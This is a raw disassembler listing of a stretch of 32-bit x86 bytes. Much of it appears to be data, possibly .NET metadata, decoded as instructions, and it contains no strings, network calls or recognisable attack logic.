  407029:	02 89 02 7b 0a 4b    	add    0x4b0a7b02(%ecx),%cl
  40702f:	02 59 01             	add    0x1(%ecx),%bl
  407032:	a9 1b 3e 01 59       	test   $0x59013e1b,%eax
  407037:	01 53 1d             	add    %edx,0x1d(%ebx)
  40703a:	c3                   	ret
  40703b:	00 a1 02 6c 1b c7    	add    %ah,-0x38e493fe(%ecx)
  407041:	00 f9                	add    %bh,%cl
  407043:	02 09                	add    (%ecx),%cl
  407045:	15 6b 01 f9 02       	adc    $0x2f9016b,%eax
  40704a:	10 0b                	adc    %cl,(%ebx)
  40704c:	23 02                	and    (%edx),%eax
  40704e:	01 03                	add    %eax,(%ebx)
  407050:	09 15 0e 00 01 03    	or     %edx,0x301000e
  407056:	51                   	push   %ecx
  407057:	07                   	pop    %es
  407058:	47                   	inc    %edi
  407059:	02 c1                	add    %cl,%al
  40705b:	01 9d 14 47 02 c1    	add    %ebx,-0x3efdb8ec(%ebp)
  407061:	01 c7                	add    %eax,%edi
  407063:	17                   	pop    %ss
  407064:	42                   	inc    %edx
  407065:	02 09                	add    (%ecx),%cl
  407067:	03 09                	add    (%ecx),%ecx
  407069:	15 6b 01 09 03       	adc    $0x309016b,%eax
  40706e:	62 19                	bound  %ebx,(%ecx)
  407070:	6a 05                	push   $0x5
  407072:	11 03                	adc    %eax,(%ebx)
  407074:	f1                   	int1
  407075:	14 70                	adc    $0x70,%al
  407077:	05 19 03 f2 1a       	add    $0x1af20319,%eax
  40707c:	76 05                	jbe    0x407083
  40707e:	21 03                	and    %eax,(%ebx)
  407080:	d9 0f                	(bad) (%edi)
  407082:	7c 05                	jl     0x407089
  407084:	c1 01 0e             	roll   $0xe,(%ecx)
  407087:	1a 47 02             	sbb    0x2(%edi),%al
  40708a:	19 03                	sbb    %eax,(%ebx)
  40708c:	de 1b                	ficomps (%ebx)
  40708e:	bf 01 81 02 d2       	mov    $0xd2028101,%edi
  407093:	05 86 05 29 03       	add    $0x3290586,%eax
  407098:	6e                   	outsb  %ds:(%esi),(%dx)
  407099:	00 f4                	add    %dh,%ah
  40709b:	01 59 01             	add    %ebx,0x1(%ecx)
  40709e:	53                   	push   %ebx
  40709f:	1b 7b 00             	sbb    0x0(%ebx),%edi
  4070a2:	59                   	pop    %ecx
  4070a3:	01 7f 07             	add    %edi,0x7(%edi)
  4070a6:	c3                   	ret
  4070a7:	00 59 01             	add    %bl,0x1(%ecx)
  4070aa:	41                   	inc    %ecx
  4070ab:	07                   	pop    %es
  4070ac:	c3                   	ret
  4070ad:	00 59 01             	add    %bl,0x1(%ecx)
  4070b0:	08 11                	or     %dl,(%ecx)
  4070b2:	93                   	xchg   %eax,%ebx
  4070b3:	05 c1 01 c5 18       	add    $0x18c501c1,%eax
  4070b8:	99                   	cltd
  4070b9:	05 49 03 09 15       	add    $0x15090349,%eax
  4070be:	0e                   	push   %cs
  4070bf:	00 61 01             	add    %ah,0x1(%ecx)
  4070c2:	5c                   	pop    %esp
  4070c3:	02 cd                	add    %ch,%cl
  4070c5:	03 51 03             	add    0x3(%ecx),%edx
  4070c8:	21 0d 75 01 69 00    	and    %ecx,0x690175
  4070ce:	09 15 0e 00 21 02    	or     %edx,0x221000e
  4070d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4070d5:	0c 70                	or     $0x70,%al
  4070d7:	01 69 00             	add    %ebp,0x0(%ecx)
  4070da:	d3 04 aa             	roll   %cl,(%edx,%ebp,4)
  4070dd:	05 c1 01 d2 0c       	add    $0xcd201c1,%eax
  4070e2:	b0 05                	mov    $0x5,%al
  4070e4:	c1 01 4b             	roll   $0x4b,(%ecx)
  4070e7:	14 47                	adc    $0x47,%al
  4070e9:	02 c1                	add    %cl,%al
  4070eb:	01 ec                	add    %ebp,%esp
  4070ed:	04 bd                	add    $0xbd,%al
  4070ef:	05 59 01 e2 0f       	add    $0xfe20159,%eax
  4070f4:	1d 00 61 03 6e       	sbb    $0x6e036100,%eax
  4070f9:	0c 47                	or     $0x47,%al
  4070fb:	02 69 03             	add    0x3(%ecx),%ch
  4070fe:	50                   	push   %eax
  4070ff:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  407104:	ba 07 c3 05 59       	mov    $0x5905c307,%edx
  407109:	03 cc                	add    %esp,%ecx
  40710b:	07                   	pop    %es
  40710c:	c3                   	ret
  40710d:	05 59 03 6e 0c       	add    $0xc6e0359,%eax
  407112:	47                   	inc    %edi
  407113:	02 71 03             	add    0x3(%ecx),%dh
  407116:	fe                   	(bad)
  407117:	1a c9                	sbb    %cl,%cl
  407119:	05 79 03 09 15       	add    $0x15090379,%eax
  40711e:	cf                   	iret
  40711f:	05 79 03 7b 06       	add    $0x67b0379,%eax
  407124:	d6                   	salc
  407125:	05 c1 00 68 08       	add    $0x86800c1,%eax
  40712a:	0e                   	push   %cs
  40712b:	00 19                	add    %bl,(%ecx)
  40712d:	00 68 08             	add    %ch,0x8(%eax)
  407130:	0e                   	push   %cs
  407131:	00 09                	add    %cl,(%ecx)
  407133:	03 09                	add    (%ecx),%ecx
  407135:	15 36 02 0c 00       	adc    $0xc0236,%eax
  40713a:	09 15 0e 00 0c 00    	or     %edx,0xc000e
  407140:	2c 03                	sub    $0x3,%al
  407142:	f5                   	cmc
  407143:	05 0c 00 49 1b       	add    $0x1b49000c,%eax
  407148:	f4                   	hlt
  407149:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40714c:	7a 1c                	jp     0x40716a
  40714e:	fb                   	sti
  40714f:	05 c1 01 e7 10       	add    $0x10e701c1,%eax
  407154:	01 06                	add    %eax,(%esi)
  407156:	51                   	push   %ecx
  407157:	00 f6                	add    %dh,%dh
  407159:	17                   	pop    %ss
  40715a:	11 06                	adc    %eax,(%esi)
  40715c:	51                   	push   %ecx
  40715d:	00 fe                	add    %bh,%dh
  40715f:	01 17                	add    %edx,(%edi)
  407161:	06                   	push   %es
  407162:	59                   	pop    %ecx
  407163:	00 75 03             	add    %dh,0x3(%ebp)
  407166:	17                   	pop    %ss
  407167:	06                   	push   %es
  407168:	89 03                	mov    %eax,(%ebx)
  40716a:	73 1d                	jae    0x407189
  40716c:	1d 06 69 00 09       	sbb    $0x9006906,%eax
  407171:	15 01 03 61 00       	adc    $0x610301,%eax
  407176:	09 15 2d 06 91 03    	or     %edx,0x391062d
  40717c:	68 08 0e 00 99       	push   $0x99000e08
  407181:	03 09                	add    (%ecx),%ecx
  407183:	15 56 04 a1 03       	adc    $0x3a10456,%eax
  407188:	bd 0b 35 06 81       	mov    $0x8106350b,%ebp
  40718d:	02 21                	add    (%ecx),%ah
  40718f:	05 0a 00 91 02       	add    $0x291000a,%eax
  407194:	a9 1c 35 05 91       	test   $0x9105351c,%eax
  407199:	02 c2                	add    %dl,%al
  40719b:	0a 43 06             	or     0x6(%ebx),%al
  40719e:	89 01                	mov    %eax,(%ecx)
  4071a0:	83 05 47 02 91 02 a9 	addl   $0xffffffa9,0x2910247
  4071a7:	1c 54                	sbb    $0x54,%al
  4071a9:	06                   	push   %es
  4071aa:	91                   	xchg   %eax,%ecx
  4071ab:	02 b9 0a 7c 05 91    	add    -0x6efa83f6(%ecx),%bh
  4071b1:	02 a2 0a 6b 01 91    	add    -0x6efe94f6(%edx),%ah
  4071b7:	02 c3                	add    %bl,%al
  4071b9:	1c 5e                	sbb    $0x5e,%al
  4071bb:	06                   	push   %es
  4071bc:	91                   	xchg   %eax,%ecx
  4071bd:	02 72 05             	add    0x5(%edx),%dh
  4071c0:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071c3:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  4071c6:	f5                   	cmc
  4071c7:	05 b9 03 b2 1b       	add    $0x1bb203b9,%eax
  4071cc:	7c 06                	jl     0x4071d4
  4071ce:	1c 00                	sbb    $0x0,%al
  4071d0:	f1                   	int1
  4071d1:	14 92                	adc    $0x92,%al
  4071d3:	06                   	push   %es
  4071d4:	24 00                	and    $0x0,%al
  4071d6:	f2 1a a4 06 1c 00 ed 	repnz sbb 0xaed001c(%esi,%eax,1),%ah
  4071dd:	0a 
  4071de:	a9 06 24 00 de       	test   $0xde002406,%eax
  4071e3:	1b bf 01 c9 03 c4    	sbb    -0x3bfc36ff(%edi),%edi
  4071e9:	10 b3 06 c9 03 22    	adc    %dh,0x2203c906(%ebx)
  4071ef:	03 b9 06 d1 03 2f    	add    0x2f03d106(%ecx),%edi
  4071f5:	08 c1                	or     %al,%cl
  4071f7:	06                   	push   %es
  4071f8:	e1 03                	loope  0x4071fd
  4071fa:	f4                   	hlt
  4071fb:	04 c8                	add    $0xc8,%al
  4071fd:	06                   	push   %es
  4071fe:	d9 03                	flds   (%ebx)
  407200:	12 06                	adc    (%esi),%al
  407202:	cf                   	iret
  407203:	06                   	push   %es
  407204:	f1                   	int1
  407205:	03 bd 08 d8 06 01    	add    0x106d808(%ebp),%edi
  40720b:	04 d9                	add    $0xd9,%al
  40720d:	12 e2                	adc    %dl,%ah
  40720f:	06                   	push   %es
  407210:	2c 00                	sub    $0x0,%al
  407212:	bd 08 17 07 2c       	mov    $0x2c071708,%ebp
  407217:	00 75 19             	add    %dh,0x19(%ebp)
  40721a:	23 07                	and    (%edi),%eax
  40721c:	34 00                	xor    $0x0,%al
  40721e:	9f                   	lahf
  40721f:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  407224:	09 15 0e 00 c1 01    	or     %edx,0x1c1000e
  40722a:	b1 1d                	mov    $0x1d,%cl
  40722c:	84 00                	test   %al,(%eax)
  40722e:	21 04 09             	and    %eax,(%ecx,%ecx,1)
  407231:	15 6b 01 19 04       	adc    $0x419016b,%eax
  407236:	09 15 59 07 29 04    	or     %edx,0x4290759
  40723c:	bd 16 61 07 51       	mov    $0x51076116,%ebp
  407241:	01 39                	add    %edi,(%ecx)
  407243:	0c 93                	or     $0x93,%al
  407245:	01 49 04             	add    %ecx,0x4(%ecx)
  407248:	09 15 6b 01 59 02    	or     %edx,0x259016b
  40724e:	09 15 0e 00 31 04    	or     %edx,0x431000e
  407254:	09 15 0e 00 51 04    	or     %edx,0x451000e
  40725a:	65 0b 01             	or     %gs:(%ecx),%eax
  40725d:	03 51 04             	add    0x4(%ecx),%edx
  407260:	02 0b                	add    (%ebx),%cl
  407262:	01 03                	add    %eax,(%ebx)
  407264:	51                   	push   %ecx
  407265:	04 03                	add    $0x3,%al
  407267:	05 7a 07 51 04       	add    $0x451077a,%eax
  40726c:	b1 0b                	mov    $0xb,%cl
  40726e:	81 07 51 04 a1 1c    	addl   $0x1ca10451,(%edi)
  407274:	2b 02                	sub    (%edx),%eax
  407276:	51                   	push   %ecx
  407277:	04 96                	add    $0x96,%al
  407279:	02 0e                	add    (%esi),%cl
  40727b:	00 51 04             	add    %dl,0x4(%ecx)
  40727e:	2e 15 88 07 39 04    	cs adc $0x4390788,%eax
  407284:	09 15 8e 07 51 04    	or     %edx,0x451078e
  40728a:	88 02                	mov    %al,(%edx)
  40728c:	31 02                	xor    %eax,(%edx)
  40728e:	39 04 54             	cmp    %eax,(%esp,%edx,2)
  407291:	0e                   	push   %cs
  407292:	0e                   	push   %cs
  407293:	00 41 04             	add    %al,0x4(%ecx)
  407296:	09 15 2b 02 59 02    	or     %edx,0x259022b
  40729c:	7a 1c                	jp     0x4072ba
  40729e:	31 02                	xor    %eax,(%edx)
  4072a0:	51                   	push   %ecx
  4072a1:	03 21                	add    (%ecx),%esp
  4072a3:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a8:	09 15 6b 01 51 04    	or     %edx,0x451016b
  4072ae:	8f 02                	pop    (%edx)
  4072b0:	2b 02                	sub    (%edx),%eax
  4072b2:	51                   	push   %ecx
  4072b3:	04 1e                	add    $0x1e,%al
  4072b5:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072ba:	85 0d 23 02 81 04    	test   %ecx,0x4810223
  4072c0:	34 1d                	xor    $0x1d,%al
  4072c2:	be 07 91 04 5d       	mov    $0x5d049107,%esi
  4072c7:	1c d0                	sbb    $0xd0,%al
  4072c9:	07                   	pop    %es
  4072ca:	a1 04 09 15 0e       	mov    0xe150904,%eax
  4072cf:	00 c1                	add    %al,%cl
  4072d1:	01 d1                	add    %edx,%ecx
  4072d3:	18 f9                	sbb    %bh,%cl
  4072d5:	07                   	pop    %es
  4072d6:	49                   	dec    %ecx
  4072d7:	02 bd 16 99 01 49    	add    0x49019916(%ebp),%bh
  4072dd:	02 bd 16 ab 01 a9    	add    -0x56fe54ea(%ebp),%bh
  4072e3:	00 09                	add    %cl,(%ecx)
  4072e5:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072ea:	d9 0f                	(bad) (%edi)
  4072ec:	06                   	push   %es
  4072ed:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072f0:	49                   	dec    %ecx
  4072f1:	1b f4                	sbb    %esp,%esi
  4072f3:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072f6:	ce                   	into
  4072f7:	12 0e                	adc    (%esi),%cl
  4072f9:	00 c1                	add    %al,%cl
  4072fb:	01 7a 17             	add    %edi,0x17(%edx)
  4072fe:	42                   	inc    %edx
  4072ff:	02 c1                	add    %cl,%al
  407301:	00 98 0a 28 08 49    	add    %bl,0x4908280a(%eax)
  407307:	02 bd 16 a5 01 51    	add    0x5101a516(%ebp),%bh
  40730d:	01 b7 00 32 08 c1    	add    %esi,-0x3ef7ce00(%edi)
  407313:	01 43 10             	add    %eax,0x10(%ebx)
  407316:	47                   	inc    %edi
  407317:	02 a9 04 76 08 37    	add    0x37087604(%ecx),%ch
  40731d:	08 51 01             	or     %dl,0x1(%ecx)
  407320:	b7 00                	mov    $0x0,%bh
  407322:	3c 08                	cmp    $0x8,%al
  407324:	51                   	push   %ecx
  407325:	01 b7 00 41 08 51    	add    %esi,0x51084100(%edi)
  40732b:	01 b7 00 46 08 51    	add    %esi,0x51084600(%edi)
  407331:	01 d8                	add    %ebx,%eax
  407333:	00 4d 08             	add    %cl,0x8(%ebp)
  407336:	41                   	inc    %ecx
  407337:	03 76 08             	add    0x8(%esi),%esi
  40733a:	52                   	push   %edx
  40733b:	08 51 01             	or     %dl,0x1(%ecx)
  40733e:	d8 00                	fadds  (%eax)
  407340:	57                   	push   %edi
  407341:	08 51 01             	or     %dl,0x1(%ecx)
  407344:	d8 00                	fadds  (%eax)
  407346:	5c                   	pop    %esp
  407347:	08 51 01             	or     %dl,0x1(%ecx)
  40734a:	d8 00                	fadds  (%eax)
  40734c:	61                   	popa
  40734d:	08 51 01             	or     %dl,0x1(%ecx)
  407350:	be 05 68 08 b1       	mov    $0xb1086805,%esi
  407355:	04 76                	add    $0x76,%al
  407357:	08 6d 08             	or     %ch,0x8(%ebp)
  40735a:	49                   	dec    %ecx
  40735b:	02 bd 16 7a 08 59    	add    0x59087a16(%ebp),%bh
  407361:	03 4a 1d             	add    0x1d(%edx),%ecx
  407364:	23 02                	and    (%edx),%eax
  407366:	e1 02                	loope  0x40736a
  407368:	09 15 88 08 c1 00    	or     %edx,0xc10888
  40736e:	8f 0a f4 01          	(bad)
  407372:	89 01                	mov    %eax,(%ecx)
  407374:	09 15 6b 01 49 02    	or     %edx,0x249016b
  40737a:	ea 00 b6 08 49 02 3b 	ljmp   $0x3b02,$0x4908b600
  407381:	06                   	push   %es
  407382:	bd 08 49 02 be       	mov    $0xbe024908,%ebp
  407387:	05 c4 08 49 02       	add    $0x24908c4,%eax
  40738c:	65 00 cb             	gs add %cl,%bl
  40738f:	08 49 02             	or     %cl,0x2(%ecx)
  407392:	b7 00                	mov    $0x0,%bh
  407394:	d2 08                	rorb   %cl,(%eax)
  407396:	49                   	dec    %ecx
  407397:	02 f3                	add    %bl,%dh
  407399:	00 d9                	add    %bl,%cl
  40739b:	08 49 02             	or     %cl,0x2(%ecx)
  40739e:	d8 00                	fadds  (%eax)
  4073a0:	e0 08                	loopne 0x4073aa
  4073a2:	49                   	dec    %ecx
  4073a3:	02 bd 16 12 09 d1    	add    -0x2ef6edea(%ebp),%bh
  4073a9:	04 09                	add    $0x9,%al
  4073ab:	15 28 09 09 00       	adc    $0x90928,%eax
  4073b0:	80 00 0d             	addb   $0xd,(%eax)
  4073b3:	01 09                	add    %ecx,(%ecx)
  4073b5:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073bc:	88 00                	mov    %al,(%eax)
  4073be:	17                   	pop    %ss
  4073bf:	01 08                	add    %ecx,(%eax)
  4073c1:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073c7:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073ce:	a0 00 66 01 08       	mov    0x8016600,%al
  4073d3:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073da:	ec                   	in     (%dx),%al
  4073db:	00 7f 02             	add    %bh,0x2(%edi)
  4073de:	08 00                	or     %al,(%eax)
  4073e0:	f0 00 17             	lock add %dl,(%edi)
  4073e3:	01 08                	add    %ecx,(%eax)
  4073e5:	00 f4                	add    %dh,%ah
  4073e7:	00 12                	add    %dl,(%edx)
  4073e9:	01 08                	add    %ecx,(%eax)
  4073eb:	00 f8                	add    %bh,%al
  4073ed:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073f4:	89 02                	mov    %eax,(%edx)
  4073f6:	08 00                	or     %al,(%eax)
  4073f8:	00 01                	add    %al,(%ecx)
  4073fa:	8e 02                	mov    (%edx),%es
  4073fc:	08 00                	or     %al,(%eax)
  4073fe:	04 01                	add    $0x1,%al
  407400:	93                   	xchg   %eax,%ebx
  407401:	02 08                	add    (%eax),%cl
  407403:	00 08                	add    %cl,(%eax)
  407405:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  40740b:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407411:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  407417:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  40741d:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  407424:	06                   	push   %es
  407425:	03 2e                	add    (%esi),%ebp
  407427:	00 33                	add    %dh,(%ebx)
  407429:	00 0f                	add    %cl,(%edi)
  40742b:	03 2e                	add    (%esi),%ebp
  40742d:	00 3b                	add    %bh,(%ebx)
  40742f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  407432:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407436:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  40743b:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407441:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  407447:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  40744d:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  407453:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407459:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  40745f:	00 43 03             	add    %al,0x3(%ebx)
  407462:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407469:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  40746f:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  407475:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  40747b:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407481:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  407487:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  40748d:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  407493:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407499:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  40749f:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  4074a5:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074ab:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074b1:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074b7:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074bd:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074c3:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c9:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074cf:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074d5:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074db:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074e1:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074e7:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074ed:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074f3:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f9:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074ff:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  407505:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  40750b:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407511:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  407517:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  40751d:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  407523:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407529:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  40752f:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  407535:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  40753b:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407541:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407547:	00 20                	add    %ah,(%eax)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40754e:	01 00                	add    %eax,(%eax)
  407550:	06                   	push   %es
  407551:	00 00                	add    %al,(%eax)
  407553:	00 1e                	add    %bl,(%esi)
  407555:	00 c0                	add    %al,%al
  407557:	03 c9                	add    %ecx,%ecx
  407559:	03 f4                	add    %esp,%esi
  40755b:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  407562:	54                   	push   %esp
  407563:	05 59 05 81 05       	add    $0x5810559,%eax
  407568:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  40756e:	b6 05                	mov    $0x5,%dh
  407570:	dd 05 08 06 27 06    	fldl   0x6270608
  407576:	3c 06                	cmp    $0x6,%al
  407578:	4c                   	dec    %esp
  407579:	06                   	push   %es
  40757a:	66 06                	pushw  %es
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	06                   	push   %es
  40757e:	53                   	push   %ebx
  40757f:	07                   	pop    %es
  407580:	67 07                	addr16 pop %es
  407582:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  407587:	07                   	pop    %es
  407588:	e8 07 f0 07 ff       	call   0xff486594
  40758d:	07                   	pop    %es
  40758e:	0c 08                	or     $0x8,%al
  407590:	11 08                	adc    %ecx,(%eax)
  407592:	20 08                	and    %cl,(%eax)
  407594:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407599:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  40759f:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  4075a5:	08 f7                	or     %dh,%bh
  4075a7:	08 fc                	or     %bh,%ah
  4075a9:	08 02                	or     %al,(%edx)
  4075ab:	09 0b                	or     %ecx,(%ebx)
  4075ad:	09 18                	or     %ebx,(%eax)
  4075af:	09 31                	or     %esi,(%ecx)
  4075b1:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075b4:	01 00                	add    %eax,(%eax)
  4075b6:	16                   	push   %ss
  4075b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ba:	17                   	pop    %ss
  4075bb:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 68 1a             	add    %ch,0x1a(%eax)
  4075c6:	9f                   	lahf
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 4c 1a a4          	add    %cl,-0x5c(%edx,%ebx,1)
  4075cd:	00 00                	add    %al,(%eax)
  4075cf:	00 a5 13 a9 00 00    	add    %ah,0xa913(%ebp)
  4075d5:	00 31                	add    %dh,(%ecx)
  4075d7:	0b ae 00 00 00 e2    	or     -0x1e000000(%esi),%ebp
  4075dd:	19 ae 00 00 00 e3    	sbb    %ebp,-0x1d000000(%esi)
  4075e3:	0a b2 00 00 00 60    	or     0x60000000(%edx),%dh
  4075e9:	03 b7 00 00 00 00    	add    0x0(%edi),%esi
  4075ef:	03 bb 00 00 00 9b    	add    -0x65000000(%ebx),%edi
  4075f5:	0b b2 00 00 00 05    	or     0x5000000(%edx),%esi
  4075fb:	0f bf 00             	movswl (%eax),%eax
  4075fe:	00 00                	add    %al,(%eax)
  407600:	00 0d b7 00 00 00    	add    %cl,0xb7
  407606:	ac                   	lods   %ds:(%esi),%al
  407607:	1a c3                	sbb    %bl,%al
  407609:	01 00                	add    %eax,(%eax)
  40760b:	00 dd                	add    %bl,%ch
  40760d:	0f f8 01             	psubb  (%ecx),%mm0
  407610:	00 00                	add    %al,(%eax)
  407612:	a0 0d fe 01 00       	mov    0x1fe0d,%al
  407617:	00 ae 0c 69 02 00    	add    %ch,0x2690c(%esi)
  40761d:	00 e5                	add    %ah,%ch
  40761f:	13 6d 02             	adc    0x2(%ebp),%ebp
  407622:	00 00                	add    %al,(%eax)
  407624:	10 19                	adc    %bl,(%ecx)
  407626:	71 02                	jno    0x40762a
  407628:	00 00                	add    %al,(%eax)
  40762a:	91                   	xchg   %eax,%ecx
  40762b:	1c 75                	sbb    $0x75,%al
  40762d:	02 00                	add    (%eax),%al
  40762f:	00 02                	add    %al,(%edx)
  407631:	08 7a 02             	or     %bh,0x2(%edx)
  407634:	02 00                	add    (%eax),%al
  407636:	06                   	push   %es
  407637:	00 03                	add    %al,(%ebx)
  407639:	00 01                	add    %al,(%ecx)
  40763b:	00 07                	add    %al,(%edi)
  40763d:	00 03                	add    %al,(%ebx)
  40763f:	00 02                	add    %al,(%edx)
  407641:	00 08                	add    %cl,(%eax)
  407643:	00 05 00 01 00 09    	add    %al,0x9000100
  407649:	00 05 00 02 00 0a    	add    %al,0xa000200
  40764f:	00 07                	add    %al,(%edi)
  407651:	00 01                	add    %al,(%ecx)
  407653:	00 0b                	add    %cl,(%ebx)
  407655:	00 07                	add    %al,(%edi)
  407657:	00 02                	add    %al,(%edx)
  407659:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765c:	09 00                	or     %eax,(%eax)
  40765e:	01 00                	add    %eax,(%eax)
  407660:	0d 00 09 00 02       	or     $0x2000900,%eax
  407665:	00 0e                	add    %cl,(%esi)
  407667:	00 0b                	add    %cl,(%ebx)
  407669:	00 01                	add    %al,(%ecx)
  40766b:	00 0f                	add    %cl,(%edi)
  40766d:	00 0b                	add    %cl,(%ebx)
  40766f:	00 02                	add    %al,(%edx)
  407671:	00 10                	add    %dl,(%eax)
  407673:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407679:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40767f:	00 0f                	add    %cl,(%edi)
  407681:	00 01                	add    %al,(%ecx)
  407683:	00 13                	add    %dl,(%ebx)
  407685:	00 0f                	add    %cl,(%edi)
  407687:	00 02                	add    %al,(%edx)
  407689:	00 14 00             	add    %dl,(%eax,%eax,1)
  40768c:	11 00                	adc    %eax,(%eax)
  40768e:	02 00                	add    (%eax),%al
  407690:	15 00 13 00 01       	adc    $0x1001300,%eax
  407695:	00 16                	add    %dl,(%esi)
  407697:	00 13                	add    %dl,(%ebx)
  407699:	00 02                	add    %al,(%edx)
  40769b:	00 17                	add    %dl,(%edi)
  40769d:	00 15 00 01 00 18    	add    %dl,0x18000100
  4076a3:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a9:	00 17                	add    %dl,(%edi)
  4076ab:	00 01                	add    %al,(%ecx)
  4076ad:	00 1a                	add    %bl,(%edx)
  4076af:	00 17                	add    %dl,(%edi)
  4076b1:	00 02                	add    %al,(%edx)
  4076b3:	00 60 00             	add    %ah,0x0(%eax)
  4076b6:	19 00                	sbb    %eax,(%eax)
  4076b8:	02 00                	add    (%eax),%al
  4076ba:	68 00 1b 00 02       	push   $0x2001b00
  4076bf:	00 69 00             	add    %ch,0x0(%ecx)
  4076c2:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076c7:	00 1f                	add    %bl,(%edi)
  4076c9:	00 01                	add    %al,(%ecx)
  4076cb:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076d2:	8d 00                	lea    (%eax),%eax
  4076d4:	21 00                	and    %eax,(%eax)
  4076d6:	01 00                	add    %eax,(%eax)
  4076d8:	8e 00                	mov    (%eax),%es
  4076da:	21 00                	and    %eax,(%eax)
  4076dc:	02 00                	add    (%eax),%al
  4076de:	8f 00                	pop    (%eax)
  4076e0:	23 00                	and    (%eax),%eax
  4076e2:	01 00                	add    %eax,(%eax)
  4076e4:	90                   	nop
  4076e5:	00 23                	add    %ah,(%ebx)
  4076e7:	00 02                	add    %al,(%edx)
  4076e9:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076ef:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076f5:	00 c0                	add    %al,%al
